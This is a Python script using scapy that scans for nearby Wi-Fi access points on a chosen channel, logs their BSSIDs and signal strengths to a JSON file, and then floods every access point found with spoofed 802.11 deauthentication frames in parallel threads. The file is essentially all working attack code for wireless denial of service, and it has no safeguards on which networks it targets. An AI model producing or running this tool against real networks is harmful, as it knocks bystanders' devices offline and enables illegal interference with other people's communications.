from scapy.all import *
import os
import time
import json
import threading
from colorama import *
def session_with(channel,interface="None"):
            output_file = "bssid_list.js"
            with open(output_file, "w+") as f:
                f.write("")
            os.system("clear")
            print(f"\033[4mSTATUS: {Fore.GREEN}Scanning{Fore.RESET}        Time: 14s\033[0m\n")
            print(f"{Fore.RED}{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{'STATUS':<10}{Fore.RESET}")
            results = []

            def packet_handler(pkt):
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr2
                    channel = int(ord(pkt[Dot11Elt:3].info)) if pkt[Dot11Elt:3] else None
                    rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
                    if bssid and channel is not None:
                        network = next((item for item in results if item["bssid"] == bssid), None)
                        if not network:
                            status = "SCANNED"
                            print(f"{bssid:<20}{channel:<10}{rssi:<10}{Fore.GREEN}{status:<10}")
                            results.append({"bssid": bssid, "channel": channel, "rssi": rssi})

            iface = interface
            start_time = time.time()
            os.system(f"iwconfig {iface} channel {channel}")
            while time.time() - start_time < 14:
                sniff(iface=iface, prn=packet_handler, timeout=1)

            with open(output_file, "w") as f:
                json.dump(results, f, indent=4)

            os.system("clear")
            print(f"\033[4mSTATUS: {Fore.RED}Deauthing{Fore.RESET}        Time: After\033[0m\n")
            print(f"{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{'STATUS':<10}")

            with open("bssid_list.js", "r") as file:
                data = json.load(file)

            def filtered_data_channel(channel=1):
                filtered_data = [entry for entry in data if entry.get("channel") == int(channel)]
                return filtered_data

            def deauth_bssid(bssid):
                dot11 = Dot11(addr1=bssid, addr2=bssid, addr3=bssid)
                packet = RadioTap()/dot11/Dot11Deauth()
                sendp(packet, iface=interface, count=30, inter=0.1, verbose=False)


            
            os.system("clear")
            print(f"\033[4mSTATUS: {Fore.RED}Deauthing{Fore.RESET}        Time: After\033[0m\n")
            print(f"{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{Fore.RED}{'STATUS':<10}{Fore.RESET}")
            for entry in filtered_data_channel(channel=channel):
                    status = "DEAUTHING"
                    print(f"{entry['bssid']:<20}{entry['channel']:<10}{entry['rssi']:<10}{Fore.RED}{status:<10}{Fore.RESET}")
            for entry in filtered_data_channel(channel=channel):
                    cmd = f"iwconfig {interface} channel {channel}"
                    os.system(cmd)
                    bssid = entry['bssid']
        
                    threading.Thread(target=deauth_bssid, args=(bssid,)).start()

def session_without(channel,interface="None"):
            output_file = "bssid_list.js"
            with open(output_file, "w+") as f:
                f.write("")
            os.system("clear")
            print("STATUS: Scanning        Time: 14s\n")
            print(f"{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{'STATUS':<10}")
            results = []

            def packet_handler(pkt):
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr2
                    channel = int(ord(pkt[Dot11Elt:3].info)) if pkt[Dot11Elt:3] else None
                    rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
                    if bssid and channel is not None:
                        network = next((item for item in results if item["bssid"] == bssid), None)
                        if not network:
                            status = "SCANNED"
                            print(f"{bssid:<20}{channel:<10}{rssi:<10}{status:<10}")
                            results.append({"bssid": bssid, "channel": channel, "rssi": rssi})

            iface = interface
            start_time = time.time()
            os.system(f"iwconfig {iface} channel {channel}")
            while time.time() - start_time < 14:
                sniff(iface=iface, prn=packet_handler, timeout=1)

            with open(output_file, "w") as f:
                json.dump(results, f, indent=4)

            os.system("clear")
            print("STATUS: Deauthing        Time: After\n")
            print(f"{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{'STATUS':<10}")

            with open("bssid_list.js", "r") as file:
                data = json.load(file)

            def filtered_data_channel(channel=1):
                filtered_data = [entry for entry in data if entry.get("channel") == int(channel)]
                return filtered_data

            def deauth_bssid(bssid):
                dot11 = Dot11(addr1=bssid, addr2=bssid, addr3=bssid)
                packet = RadioTap()/dot11/Dot11Deauth()
                sendp(packet, iface=interface, count=30, inter=0.1, verbose=False)


            
            os.system("clear")
            print(f"STATUS: Deauthing        Time: Channel {channel}\n")
            print(f"{'BSSID':<20}{'CHANNEL':<10}{'RSSI':<10}{'STATUS':<10}")
            for entry in filtered_data_channel(channel=channel):
                status = "DEAUTHING"
                print(f"{entry['bssid']:<20}{entry['channel']:<10}{entry['rssi']:<10}{status:<10}")
            for entry in filtered_data_channel(channel=channel):
                cmd = f"iwconfig {interface} channel {channel}"
                os.system(cmd)
                bssid = entry['bssid']
        
                threading.Thread(target=deauth_bssid, args=(bssid,)).start()
